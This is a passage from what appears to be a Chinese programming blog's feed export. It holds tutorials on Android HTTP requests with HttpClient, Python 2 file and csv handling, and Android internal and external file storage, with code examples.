<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getMethod</span><span class="params">()</span> </span>&#123;</div><div class="line">        </div><div class="line">    String url = <span class="string">"http://blog.line-coding.tech/"</span>;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        HttpClient client = <span class="keyword">new</span> DefaultHttpClient();    <span class="comment">//创建HttpClient对象</span></div><div class="line">        HttpGet get = <span class="keyword">new</span> HttpGet(url);     <span class="comment">//创建HttpGet对象</span></div><div class="line">        HttpResponse response = client.execute(get);    <span class="comment">//执行HttpClient请求</span></div><div class="line">        <span class="keyword">if</span> (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) &#123;</div><div class="line">            result = EntityUtils.toString(response.getEntity());    <span class="comment">//获取返回结果</span></div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            result = <span class="string">"请求失败"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">catch</span> (ClientProtocolException e) &#123;</div><div class="line">        <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">        e.printStackTrace();</div><div class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">        <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">        e.printStackTrace();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="发送-POST-请求-1"><a href="#发送-POST-请求-1" class="headerlink" title="发送 POST 请求"></a>发送 POST 请求</h5><ul>
<li>使用流程</li>
</ul>
<ol>
<li><p>创建 HttpClient 对象</p>
</li>
<li><p>创建 HttpGet 对象</p>
</li>
<li><p>调用 HttpPost 的 setParams() 方法来添加请求参数，也可调用 setEntity() 方法来设置请求参数。</p>
</li>
<li><p>调用 HttpClient 对象的 execute() 方法发送请求。</p>
</li>
<li><p>调用 HttpResponse 的 getEntity() 方法获得包含服务器响应内容的 HttpEntity 对象。</p>
</li>
</ol>
<ul>
<li>使用示例：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postMethod</span><span class="params">()</span> </span>&#123;</div><div class="line">    </div><div class="line">    String url = <span class="string">"http://data.line-coding.tech/register.php"</span>;</div><div class="line">    HttpClient client = <span class="keyword">new</span> DefaultHttpClient();    <span class="comment">//创建HttpClient对象</span></div><div class="line">    HttpPost post = <span class="keyword">new</span> HttpPost(url);      <span class="comment">//创建HttpGet对象</span></div><div class="line">    List&lt;NameValuePair&gt; params = <span class="keyword">new</span> ArrayList&lt;NameValuePair&gt;();</div><div class="line">    params.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">"username"</span>, <span class="string">"13674852343"</span>));</div><div class="line">    params.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">"password"</span>, <span class="string">"123456"</span>));   </div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        post.setEntity(<span class="keyword">new</span> UrlEncodedFormEntity(params,<span class="string">"utf-8"</span>));   <span class="comment">//添加参数</span></div><div class="line">        HttpResponse response = client.execute(post);   <span class="comment">//执行HttpClient请求</span></div><div class="line">        <span class="keyword">if</span> (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) &#123; <span class="comment">//判断请求是否成功</span></div><div class="line">            result = EntityUtils.toString(response.getEntity());    <span class="comment">//获取返回结果</span></div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            result = <span class="string">"请求失败"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</div><div class="line">        <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">        e.printStackTrace();</div><div class="line">    &#125; <span class="keyword">catch</span> (ClientProtocolException e) &#123;</div><div class="line">        <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">        e.printStackTrace();</div><div class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">        <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">        e.printStackTrace();</div><div class="line">    &#125;;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="简单的-Demo"><a href="#简单的-Demo" class="headerlink" title="简单的 Demo"></a>简单的 Demo</h4><p>　　通过在 MainActivity 中使用子线程分别调用以上四个方法来发送 Http 请求，并通过 Handler 在子线程和主线程之间传递消息，通知主线程更新 UI，以此来测试所写的方法是否可行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">private</span> TextView mTextView;</div><div class="line"><span class="keyword">private</span> String result = <span class="string">""</span>;</div><div class="line"></div><div class="line"><span class="keyword">private</span> Handler mHandler = <span class="keyword">new</span> Handler() &#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(Message msg)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (result != <span class="keyword">null</span>) &#123;</div><div class="line">            mTextView.setText(result);  <span class="comment">//收到通知，则将Http请求的结果显示在界面上</span></div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">    setContentView(R.layout.activity_main);</div><div class="line">    </div><div class="line">    mTextView = (TextView) findViewById(R.id.tv_result);</div><div class="line"></div><div class="line">    <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;     <span class="comment">//开启子线程来执行网络请求</span></div><div class="line"></div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">            <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">            get();  <span class="comment">//使用HttpURLConnection的GET方法</span></div><div class="line">            <span class="comment">//post();     //使用HttpURLConnection的POST方法</span></div><div class="line">            <span class="comment">//getMethod();  //使用HttpClient的GET方法</span></div><div class="line">            <span class="comment">//postMethod(); //使用HttpClient的POST方法</span></div><div class="line">            Message msg = mHandler.obtainMessage(); <span class="comment">//获取一个Message对象</span></div><div class="line">            mHandler.sendMessage(msg);  <span class="comment">//通知UI进行更新</span></div><div class="line">        &#125;</div><div class="line">    &#125;).start();</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Http</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 文件操作</title>
    <url>/2016/08/03/Python%20%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>　　上一篇博文中我们介绍了 Python 使用 Mysql 数据库进行数据存储，数据库存储的数据需要特定的工具进行打开，而普通的数据文件是一般的电脑都能打开进行查看的，因此数据库存储的通用性没有文件存储那么好，文件存储也是 Python 网络爬虫的常用存储方式之一，特别是 csv 文件，所以我们对于文件的输入输出流操作、缓存、基本的读写方式、文件迭代器等我们都需要有一些基本的了解，并熟练掌握文件的读写操作，为我们的爬虫实战打下坚实的基础。</p>
<a id="more"></a>
<h4 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h4><p>　　打开文件使用 open 函数，其中文件名是必选参数，文件模式和缓冲是可选参数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">open(name[,mode[,buffering]])</div></pre></td></tr></table></figure>
<!-- more --> 
<h5 id="参数-1：文件名"><a href="#参数-1：文件名" class="headerlink" title="参数 1：文件名"></a>参数 1：文件名</h5><p>　　文件名一般采用绝对路径，其中会包含 <code>\</code> 字符，所以可在字符串前加 <code>r</code>。<code>&#39;r&#39;</code> 是防止字符转义的，如果路径中出现 <code>&#39;\t&#39;</code> 的话，不加 <code>r</code> 的话 <code>\t</code> 就会被转义 而加了 <code>&#39;r&#39;</code> 之后 <code>&#39;\t&#39;</code> 就能保留原有的样子。例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">'C:\Python27\tcl'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> s</div><div class="line">C:\Python27     cl  <span class="comment">#解释器将\t识别成一个制表符的间隔</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">r'C:\Python27\tcl'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> s</div><div class="line">C:\Python27\tcl     <span class="comment">#不进行转义，正常输出</span></div></pre></td></tr></table></figure>
<p>　　可见在字符串前加 <code>&#39;r&#39;</code> 才能正确使用文件路径。</p>
<h5 id="参数-2：文件模式"><a href="#参数-2：文件模式" class="headerlink" title="参数 2：文件模式"></a>参数 2：文件模式</h5><table>
<thead>
<tr>
<th>值</th>
<th>描述</th>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>‘r’</td>
<td>读模式</td>
<td>‘a’</td>
<td>追加模式</td>
</tr>
<tr>
<td>‘w’</td>
<td>写模式</td>
<td>‘b’</td>
<td>二进制模式</td>
</tr>
<tr>
<td>‘+’</td>
<td>读/写模式</td>
</tr>
</tbody>
</table>
<h5 id="参数-3：缓冲"><a href="#参数-3：缓冲" class="headerlink" title="参数 3：缓冲"></a>参数 3：缓冲</h5><p>　　值为 0 或者 False，输入输出是无缓冲的。值为 1 或者 True，输入输出是有缓冲的</p>
<h4 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h4><h5 id="写入数据"><a href="#写入数据" class="headerlink" title="写入数据"></a>写入数据</h5><ol>
<li>以字符串形式写入</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#以写模式打开py.txt文件，若文件不存在，则会创建，若存在则覆盖文件原来的内容</span></div><div class="line">f = open(<span class="string">r'D:\Python\py.txt'</span>,<span class="string">'w'</span>)</div><div class="line"><span class="comment">#写入Python之禅的前两句</span></div><div class="line">f.write(<span class="string">'Beautiful is better than ugly.\n'</span>)</div><div class="line">f.write(<span class="string">'Explicit is better than implicit.\n'</span>) </div><div class="line">f.flush()</div><div class="line">f.close()</div></pre></td></tr></table></figure>
<p>　　成功写入之后，txt 文件内容为以下两行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Beautiful is better than ugly.</div><div class="line">Explicit is better than implicit.</div></pre></td></tr></table></figure>
<ol>
<li>写入行</li>
</ol>
<p>　　writelines() 将传递进来的一个字符串列表中的所有的字符串写入文件，但是不会增加新行，需要自己手动添加。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#采用追加模式，再向py.txt文件写入Python之禅的三四句</span></div><div class="line">f = open(<span class="string">r'D:\Python\py.txt'</span>,<span class="string">'a'</span>)</div><div class="line">content = [<span class="string">'Simple is better than complex.\n'</span>,<span class="string">'Complex is better than complicated.\n'</span>]</div><div class="line">f.writelines(content)   </div><div class="line">f.flush()</div><div class="line">f.close()</div></pre></td></tr></table></figure>
<p>　　成功写入之后，txt 文件内容为以下四行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Beautiful is better than ugly.</div><div class="line">Explicit is better than implicit.</div><div class="line">Simple is better than complex.</div><div class="line">Complex is better than complicated.</div></pre></td></tr></table></figure>
<h5 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h5><ol>
<li>以字符串形式读取</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">f = open(<span class="string">r'D:\Python\py.txt'</span>,<span class="string">'r'</span>)</div><div class="line"><span class="keyword">print</span> f.read(<span class="number">6</span>)   <span class="comment">#读取6个字符</span></div><div class="line"><span class="keyword">print</span> f.read()  <span class="comment">#读取整个文件</span></div><div class="line">f.close()</div></pre></td></tr></table></figure>
<p>　　运行结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Beauti</div><div class="line">ful is better than ugly.</div><div class="line">Explicit is better than implicit.</div><div class="line">Simple is better than complex.</div><div class="line">Complex is better than complicated.</div></pre></td></tr></table></figure>
<p>　　可以看出，f.read(6) 先读出了 6 个字符，然后 f.read() 将其余的内容全部读出来了。</p>
<ol>
<li>读取行</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">f = open(<span class="string">r'D:\Python\py.txt'</span>,<span class="string">'r'</span>)</div><div class="line"><span class="keyword">print</span> f.readline()  <span class="comment">#读取一行数据</span></div><div class="line">f.close()</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">readline()函数，读取一行，运行结果如下：</div><div class="line">Beautiful <span class="keyword">is</span> better than ugly.</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">f = open(<span class="string">r'D:\Python\py.txt'</span>,<span class="string">'r'</span>)</div><div class="line"><span class="keyword">print</span> f.readlines()   <span class="comment">#读取文件的所有行</span></div><div class="line">f.close()</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">readlines()函数，读取一个文件的所有行，并将其作为列表返回，运行结果如下：</div><div class="line">[<span class="string">'Beautiful is better than ugly.\n'</span>, <span class="string">'Explicit is better than implicit.\n'</span>, <span class="string">'Simple is better than complex.\n'</span>, <span class="string">'Complex is better than complicated.\n'</span>]</div></pre></td></tr></table></figure>
<h4 id="对文件内容进行迭代"><a href="#对文件内容进行迭代" class="headerlink" title="对文件内容进行迭代"></a>对文件内容进行迭代</h4><h5 id="按字节处理"><a href="#按字节处理" class="headerlink" title="按字节处理"></a>按字节处理</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">filename = <span class="string">r'D:\Python\py.txt'</span></div><div class="line">f = open(filename)</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    char = f.read(<span class="number">1</span>)    <span class="comment">#每次读取一个字符</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> char: <span class="keyword">break</span>  <span class="comment">#没有字符可读了则停止</span></div><div class="line">    <span class="keyword">print</span> char  <span class="comment">#打印字符</span></div><div class="line">f.close()</div></pre></td></tr></table></figure>
<h5 id="按行处理"><a href="#按行处理" class="headerlink" title="按行处理"></a>按行处理</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">filename = <span class="string">r'D:\Python\py.txt'</span></div><div class="line">f = open(filename)</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    line = f.readline().strip()  <span class="comment">#读取一行，并去除空行</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> line: <span class="keyword">break</span>  <span class="comment">#如果没有下一行了则停止</span></div><div class="line">    <span class="keyword">print</span> line  <span class="comment">#打印读取到的一行</span></div><div class="line">f.close()</div></pre></td></tr></table></figure>
<p>　　程序运行结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Beautiful is better than ugly.</div><div class="line">Explicit is better than implicit.</div><div class="line">Simple is better than complex.</div><div class="line">Complex is better than complicated.</div></pre></td></tr></table></figure>
<h5 id="使用-fileinput-实现懒惰行迭代"><a href="#使用-fileinput-实现懒惰行迭代" class="headerlink" title="使用 fileinput 实现懒惰行迭代"></a>使用 fileinput 实现懒惰行迭代</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> fileinput</div><div class="line">filename = <span class="string">r'D:\Python\py.txt'</span></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fileinput.input(filename):</div><div class="line">    <span class="keyword">print</span> line.strip()  <span class="comment">#打印读取到的行，并去除空行</span></div></pre></td></tr></table></figure>
<p>　　程序运行结果同 2。</p>
<h5 id="文件迭代器"><a href="#文件迭代器" class="headerlink" title="文件迭代器"></a>文件迭代器</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">filename = <span class="string">r'D:\Python\py.txt'</span></div><div class="line">f = open(filename)</div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</div><div class="line">    <span class="keyword">print</span> line.strip()  <span class="comment">#打印读取到的行，并去除空行</span></div><div class="line">f.close()</div></pre></td></tr></table></figure>
<p>　　程序运行结果同 2。</p>
<h4 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h4><p>　　写入过的文件总应该关闭，因为 Python 可能会缓存写入的数据，如果程序奔溃了，那么数据就不会被写入到文件，为了安全起见，在使用完文件后要进行关闭操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#打开文件</span></div><div class="line"><span class="keyword">try</span>:</div><div class="line">    <span class="comment">#写入数据</span></div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    file.close()</div></pre></td></tr></table></figure>
<h4 id="csv-文件处理"><a href="#csv-文件处理" class="headerlink" title="csv 文件处理"></a>csv 文件处理</h4><p>　　逗号分隔值（Comma-Separated Values，CSV，有时也称为字符分隔值，因为分隔字符也可以不是逗号），其文件以纯文本形式存储表格数据（数字和文本）。csv 文件经常用于网络数据爬取的数据存储。csv 文件可以用记事本和 excel 打开进行查看。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> csv</div><div class="line"></div><div class="line">csvFile = open(<span class="string">"D:/Python/data.csv"</span>,<span class="string">'wb+'</span> )</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    writer = csv.writer(csvFile)</div><div class="line">    writer.writerow((<span class="string">'Id'</span>,<span class="string">'Name'</span>,<span class="string">'Age'</span>))    <span class="comment">#写入一行数据做列名</span></div><div class="line"></div><div class="line">    data = [(<span class="number">20160001</span>,<span class="string">'fzy'</span>,<span class="string">'21'</span>),(<span class="number">20160002</span>,<span class="string">'lyj'</span>,<span class="string">'21'</span>),(<span class="number">20160003</span>,<span class="string">'ljj'</span>,<span class="string">'20'</span>)]</div><div class="line">    writer.writerows(data)  <span class="comment">#写入多行</span></div><div class="line">    writer.writerow((<span class="number">20160004</span>,<span class="string">'cyx'</span>,<span class="string">'24'</span>))  <span class="comment">#写入一行数据</span></div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    csvFile.close()</div><div class="line"></div><div class="line">csvFile = open(<span class="string">"D:/Python/data.csv"</span>,<span class="string">'rb+'</span> )</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    reader = csv.reader(csvFile)</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> reader:</div><div class="line">        <span class="keyword">print</span> line</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    csvFile.close()</div></pre></td></tr></table></figure>
<p>　　程序运行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">[&apos;Id&apos;, &apos;Name&apos;, &apos;Age&apos;]</div><div class="line">[&apos;20160001&apos;, &apos;fzy&apos;, &apos;21&apos;]</div><div class="line">[&apos;20160002&apos;, &apos;lyj&apos;, &apos;21&apos;]</div><div class="line">[&apos;20160003&apos;, &apos;ljj&apos;, &apos;20&apos;]</div><div class="line">[&apos;20160004&apos;, &apos;cyx&apos;, &apos;24&apos;]</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>文件</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 数据存储之文件存储</title>
    <url>/2016/07/29/Android%20%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8/</url>
    <content><![CDATA[<p>　　前面两篇博客分别介绍了 Android 的 SharedPreferences 数据存储和 SQLite 数据库存储，此篇博客介绍 Android 数据存储的第三种方式：文件存储，这也是我们平时最为常用的，他的很多操作与 Java 文件操作基本一致，只是因为 Android 是基于 Linux 操作系统，所以需要对于文件目录结构需要有更深入的理解。</p>
<a id="more"></a>
<h4 id="内部存储与外部存储"><a href="#内部存储与外部存储" class="headerlink" title="内部存储与外部存储"></a>内部存储与外部存储</h4><p>　　Android 本身基于 Linux 操作系统，所以它的内部存储空间，对于应用程序和用户来讲就是 “/data/data” 目录。它与其他的（外部存储）相比有着存储方便，操作简单，更加稳定、安全等优点。但是它比较有限，比较可贵。</p>
<h5 id="内部存储（internal-storage）"><a href="#内部存储（internal-storage）" class="headerlink" title="内部存储（internal storage）"></a>内部存储（internal storage）</h5><p>　　内部存储不是内存。内部存储位于系统中很特殊的一个位置，如果你想将文件存储于内部存储中，那么文件默认只能被你的应用访问到，且一个应用所创建的所有文件都在和应用包名相同的目录下。也就是说应用创建于内部存储的文件，与这个应用是关联起来的。当一个应用卸载之后，内部存储中的这些文件也被删除。</p>
<p>　　内部存储空间十分有限，因而显得可贵，另外，它也是系统本身和系统应用程序主要的数据存储所在地，一旦内部存储空间耗尽，手机也就无法使用了。所以对于内部存储空间，我们要尽量避免使用。</p>
<table>
<thead>
<tr>
<th>内部存储目录/data/data/包名/</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>/data/data/包名/shared_prefs</td>
<td>sharedpreferrence文件存放目录</td>
</tr>
<tr>
<td>/data/data/包名/databases</td>
<td>数据库文件存放目录</td>
</tr>
<tr>
<td>/data/data/包名/files</td>
<td>应用程序默认的数据存储目录</td>
</tr>
<tr>
<td>/data/data/包名/cache</td>
<td>应用程序默认的缓存文件存放目录</td>
</tr>
</tbody>
</table>
<h5 id="外部存储（external-storage）"><a href="#外部存储（external-storage）" class="headerlink" title="外部存储（external storage）"></a>外部存储（external storage）</h5><p>　　外部存储一般就是 storage 文件夹或者 mnt 文件夹，在 storage 文件夹中有一个 sdcard 文件夹，这个文件夹中的文件又分为两类，一类是公有目录，还有一类是私有目录</p>
<p>　　由于内部存储空间有限，在开发中我们一般都是操作外部存储空间，Google 官方建议我们 App 的数据应该存储在外部存储的私有目录中该 App 的包名下，这样当用户卸载掉 App 之后，相关的数据会一并删除，如果你直接在 /storage/sdcard 目录下创建了一个应用的文件夹，那么当你删除应用的时候，这个文件夹就不会被删除。</p>
<p>　　外部存储目录 storage/sdcard，它又分为公有目录和私有目录，其中的公有目录有九大类，比如 DCIM、DOWNLOAD 等这种系统为我们创建的文件夹，私有目录就是 Android 这个文件夹，这个文件夹打开之后里边有一个 data 文件夹，打开这个 data 文件夹，里边有许多包名组成的文件夹。</p>
<p>　　注：所有的这些目录结构都可以通过打开 Android 模拟器，然后使用 DDMS 中的 File Explorer 进行查看。</p>
<h4 id="res-raw-和-assets"><a href="#res-raw-和-assets" class="headerlink" title="res/raw 和 assets"></a>res/raw 和 assets</h4><h5 id="res-raw-和-assets的相同点"><a href="#res-raw-和-assets的相同点" class="headerlink" title="res/raw 和 assets的相同点"></a>res/raw 和 assets的相同点</h5><p>　　两者目录下的文件在打包后会原封不动的保存在 apk 包中，不会被编译成二进制。</p>
<h5 id="res-raw-和-assets的不同点"><a href="#res-raw-和-assets的不同点" class="headerlink" title="res/raw 和 assets的不同点"></a>res/raw 和 assets的不同点</h5><ol>
<li><p>res/raw 中的文件会被映射到 R.java 文件中，访问的时候直接使用资源 ID 即 R.id.filename；assets 文件夹下的文件不会被映射到 R.java 中，访问的时候需要 AssetManager 类。</p>
</li>
<li><p>res/raw 不可以有目录结构，而 assets 则可以有目录结构，也就是 assets 目录下可以再建立文件夹。</p>
</li>
</ol>
<p>　　<strong>另外：</strong></p>
<ul>
<li><p>assets：用于存放需要打包到应用程序的静态文件，以便部署到设备中。与 res/raw 不同点在于，ASSETS 支持任意深度的子目录。这些文件不会生成任何资源 ID，必须使用 /assets 开始（不包含它）的相对路径名。</p>
</li>
<li><p>res：用于存放应用程序的资源（如图标、GUI 布局等），将被打包到编译后的 Java 中。不支持深度子目录。</p>
</li>
<li><p>res/raw：存放通用的文件， 该文件夹内的文件将不会被编译成二进制文件，按原样复制到设备上。</p>
</li>
</ul>
<h4 id="文件存储操作"><a href="#文件存储操作" class="headerlink" title="文件存储操作"></a>文件存储操作</h4><h5 id="读写-data-data-lt-应用程序名-gt-files-目录的文件"><a href="#读写-data-data-lt-应用程序名-gt-files-目录的文件" class="headerlink" title="读写 /data/data/&lt;应用程序名&gt;/files/ 目录的文件"></a>读写 /data/data/&lt;应用程序名&gt;/files/ 目录的文件</h5><ol>
<li>文件权限</li>
</ol>
<ul>
<li><p><strong>MODE_PRIVATE</strong> : 默认操作模式，代表该文件是私有数据，只能被应用本身访问，在该模式下，写入的内容会覆盖原文件的内容。</p>
</li>
<li><p><strong>MODE_APPEND</strong> : 该模式会检查文件是否存在，存在就往文件追加内容，否则就创建新文件。</p>
</li>
<li><p><strong>MODE_WORLD_READABLE和MODE_WORLD_WRITEABLE</strong> : 用来控制其他应用程序是否有权限读写该文件。</p>
</li>
</ul>
<ol>
<li>读文件</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">readFile</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">    String res = <span class="string">""</span>;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        FileInputStream fis = openFileInput(fileName);</div><div class="line">        <span class="keyword">int</span> length = fis.available();</div><div class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</div><div class="line">        fis.read(bytes);</div><div class="line">        res = EncodingUtils.getString(bytes, <span class="string">"UTF-8"</span>);</div><div class="line">        fis.close();</div><div class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">        e.printStackTrace();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ol>
<li>写文件</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeFile</span><span class="params">(String fileName, String str)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        FileOutputStream fos = openFileOutput(fileName, MODE_PRIVATE);</div><div class="line">        <span class="keyword">byte</span>[] bytes = str.getBytes();</div><div class="line">        fos.write(bytes);</div><div class="line">        fos.close();</div><div class="line">    &#125;<span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">        e.printStackTrace();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="读写-SD-卡文件"><a href="#读写-SD-卡文件" class="headerlink" title="读写 SD 卡文件"></a>读写 SD 卡文件</h5><p>　　目录 /mnt/sdcard 和目录 /sdcard 没有区别，它们都是指向目录 /storage/sdcard 的快捷方式。</p>
<ol>
<li>添加权限</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="comment">&lt;!-- SDCard中创建与删除文件权限 --&gt;</span>  </div><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.MOUNT_UNMOUNT_FILESYSTEMS"</span>/&gt;</span>  </div><div class="line"><span class="comment">&lt;!-- 向SDCard写入数据权限 --&gt;</span>  </div><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span>/&gt;</span></div></pre></td></tr></table></figure>
<ol>
<li>判断 SDCard 是否存在</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSdCardExist</span><span class="params">()</span> </span>&#123;  </div><div class="line">    <span class="keyword">return</span> Environment.getExternalStorageState().equals(  </div><div class="line">            Environment.MEDIA_MOUNTED);  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ol>
<li>获取 SD 卡根目录</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> File <span class="title">getSdCardPath</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">boolean</span> exist = isSdCardExist();</div><div class="line">    File dir;</div><div class="line">    <span class="keyword">if</span> (exist) &#123;</div><div class="line">        dir = Environment.getExternalStorageDirectory();</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        dir = <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> dir;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ol>
<li>写文件</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeSDCardFile</span><span class="params">(String fileName, String str)</span> </span>&#123;</div><div class="line"></div><div class="line">    File myfile = <span class="keyword">new</span> File(getSdCardPath(), fileName);</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">if</span>(!myfile.exists())&#123;   <span class="comment">//如果文件不存在则创建新文件</span></div><div class="line">            myfile.createNewFile();</div><div class="line">        &#125;</div><div class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(myfile);</div><div class="line">        <span class="keyword">byte</span>[] bytes = str.getBytes(<span class="string">"UTF-8"</span>);   <span class="comment">//将字符串转换成字节序列，并制定编码为UTF-8</span></div><div class="line">        fos.write(bytes);   </div><div class="line">        fos.flush();    <span class="comment">//将缓冲区中的数据强制写出</span></div><div class="line">        fos.close();    <span class="comment">//关闭数据流</span></div><div class="line">    &#125; <span class="keyword">catch</span> 